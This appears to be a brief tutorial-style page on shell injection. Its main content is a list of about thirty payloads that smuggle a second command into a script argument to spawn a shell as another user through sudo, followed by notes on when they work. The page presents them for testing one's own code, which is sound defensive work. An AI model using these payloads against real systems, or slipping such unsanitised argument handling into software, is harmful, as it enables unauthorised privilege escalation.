# Shell Injection

A shell injection attack is a type of attack that allow for remote code
execution (RCE).  

It is a hazard that comes with bad shell scripting habits. These types of
attack mostly happen with command line arguments that are not parsed correctly,
or variables being incorrectly used (e.g., unquoted).  

## Examples of a Shell Injection

If you have a script or binary that runs with sudo, make sure you sanitize user
input before using it.  

That is, if you invkoke a command with CLI arguments without sanitizing them
or checking them in any way, your program may be susceptible to shell injection
attacks.  

Below is a set of shell injection attack examples, which can be used to test if
your program is subject to a shell injection attack.  
```bash
./bad-script '; sudo -u targetuser /bin/sh #'
./bad-script '&& sudo -u targetuser /bin/sh #'
./bad-script '|| sudo -u targetuser /bin/sh #'
./bad-script '$(sudo -u targetuser /bin/sh)'
./bad-script '`sudo -u targetuser /bin/sh`'
./bad-script '; sudo -u targetuser /bin/bash #'
./bad-script '&& sudo -u targetuser /bin/bash #'
./bad-script '|| sudo -u targetuser /bin/bash #'
./bad-script '$(sudo -u targetuser /bin/bash)'
./bad-script '`sudo -u targetuser /bin/bash`'
./bad-script '; sudo -u targetuser sh -c "sh" #'
./bad-script '&& sudo -u targetuser sh -c "sh" #'
./bad-script '|| sudo -u targetuser sh -c "sh" #'
./bad-script '$(sudo -u targetuser sh -c "sh")'
./bad-script '`sudo -u targetuser sh -c "sh"`'
./bad-script '; /bin/sh -c "sudo -u targetuser /bin/sh" #'
./bad-script '&& /bin/sh -c "sudo -u targetuser /bin/sh" #'
./bad-script '|| /bin/sh -c "sudo -u targetuser /bin/sh" #'
./bad-script '$(/bin/sh -c "sudo -u targetuser /bin/sh")'
./bad-script '`/bin/sh -c "sudo -u targetuser /bin/sh"`'
./bad-script '; sudo -u targetuser python -c "import pty; pty.spawn('/bin/sh')" #'
./bad-script '&& sudo -u targetuser python -c "import pty; pty.spawn('/bin/sh')" #'
./bad-script '|| sudo -u targetuser python -c "import pty; pty.spawn('/bin/sh')" #'
./bad-script '$(sudo -u targetuser python -c "import pty; pty.spawn('/bin/sh')")'
./bad-script '`sudo -u targetuser python -c "import pty; pty.spawn('/bin/sh')"`'
./bad-script '; sudo -u targetuser python3 -c "import pty; pty.spawn('/bin/sh')" #'
./bad-script '&& sudo -u targetuser python3 -c "import pty; pty.spawn('/bin/sh')" #'
./bad-script '|| sudo -u targetuser python3 -c "import pty; pty.spawn('/bin/sh')" #'
./bad-script '$(sudo -u targetuser python3 -c "import pty; pty.spawn('/bin/sh')")'
./bad-script '`sudo -u targetuser python3 -c "import pty; pty.spawn('/bin/sh')"`'
```

- These assume the binary unsafely concatenates or passes the argument directly 
  into a shell command without proper sanitization (e.g., using `system()`
  syscall, `popen()` syscall, or similar).  

- If the binary uses the `exec*()` family of system calls with proper `ARGV` 
  separation, command injection may not be possible.

- Also, these assume that the current user is allowed via sudoers to 
  run `sudo -u targetuser` commands without password, otherwise you'll
  be prompted or denied.
  
